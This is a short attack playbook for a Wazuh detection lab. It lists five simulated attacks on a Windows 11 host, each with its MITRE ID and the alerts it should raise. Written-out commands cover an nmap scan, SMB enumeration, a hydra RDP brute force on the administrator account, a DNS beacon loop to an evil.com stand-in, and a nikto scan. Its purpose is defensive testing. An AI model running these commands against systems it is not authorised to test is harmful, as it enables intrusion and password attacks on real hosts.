# ⚔️ Attack Playbook

Quick reference for all attack simulations in this lab.

## Target
- **Windows 11 Host:** `<WINDOWS_HOST_IP>`
- **Kali Attacker:** `<KALI_IP>`

---

## Pre-Flight Checklist

Before running any attack, verify:
- [ ] Wazuh dashboard is accessible at `https://localhost`
- [ ] Agent `windows11-host` shows **Active** in Endpoints Summary
- [ ] Threat Hunting time range set to **Last 15 minutes**

---

## Attack 1 — Nmap Reconnaissance
**MITRE:** T1046 Network Service Discovery

```bash
sudo nmap -sS -sV -O <WINDOWS_HOST_IP>
```

Expected Wazuh alerts: Account Discovery, network connection spike

---

## Attack 2 — SMB Enumeration
**MITRE:** T1135 Network Share Discovery

```bash
enum4linux -a <WINDOWS_HOST_IP>
```

Expected Wazuh alerts: Multiple firewall drop events from same source

---

## Attack 3 — RDP Brute Force
**MITRE:** T1110 Brute Force

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz  # if not already extracted
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<WINDOWS_HOST_IP> -t 4 -W 3
```

Expected Wazuh alerts: Event ID 4625 failed logon events

---

## Attack 4 — DNS Beacon Simulation
**MITRE:** T1071.004 Application Layer Protocol: DNS

```bash
for i in $(seq 1 20); do dig @<WINDOWS_HOST_IP> malware-c2-$i.evil.com; sleep 1; done
```

Expected Wazuh alerts: Repeated DNS query events

---

## Attack 5 — HTTP Exploit Scanning
**MITRE:** T1190 Exploit Public-Facing Application

```bash
nikto -h http://<WINDOWS_HOST_IP>
```

Expected Wazuh alerts: Web attack rules, HTTP scan patterns
